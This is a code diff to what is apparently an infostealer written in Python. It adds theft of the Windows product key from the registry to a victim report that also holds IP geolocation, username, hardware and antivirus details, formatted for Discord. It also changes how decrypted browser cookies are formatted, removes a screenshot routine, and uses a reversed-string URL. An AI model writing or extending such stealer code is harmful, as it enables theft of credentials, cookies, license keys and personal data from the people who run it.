@@ -434,9 +434,27 @@ Powershell -command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName 
         content = file.read().decode('utf-8', errors='ignore').strip()
 
 
+def run_command(command):
+    try:
+        result = (
+            subprocess.check_output(command, shell=True)
+            .decode()
+            .strip()
+        )
+        return result
+    except:
+        return 'N/A'
+
+def get_product_key():
+    return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
+
+def get_product_name():
+    return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
+
 
 def globalInfo():
-    
+    pr = get_product_name()
+    winkey = get_product_key()
     url = 'nosj/oi.ofnipi//:sptth'
     response = urllib.request.urlopen(url[::-1])
     data = json.loads(response.read().decode())
@@ -471,7 +489,7 @@ def globalInfo():
         except Exception as e:
             gpu = f"An error occurred: {str(e)}"
 
-    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : {gpu} \nLatitude + Longitude  : `{latitude}, {longitude}`\n Installed antivirus :\n`{avss}` "
+    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : {gpu} \nLatitude + Longitude  : `{latitude}, {longitude}`\n Installed antivirus :\n`{avss}` "
     if len(globalinfo) > 1750:
         globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
         
@@ -1367,12 +1385,6 @@ import datetime
 import os
 import requests
 
-def take_screenshot_first_screen(filename):
-    args = ["import", "-window", "root", filename]
-    p = Popen(args)
-    p.wait()
-
-
 
 
 def srcs():
@@ -1545,7 +1557,7 @@ def getCook(path, arg):
         for row in data: 
             if row[0] != '':
 
-                Cookies.append(f"Host Key: {row[0]} | Name: {row[1]} | Value: {DecryptValue(row[2], master_key)}")
+                Cookies.append(f"{row[0]}   {row[1]}    {DecryptValue(row[2], master_key)}")
                 CookiCount += 1
         
 
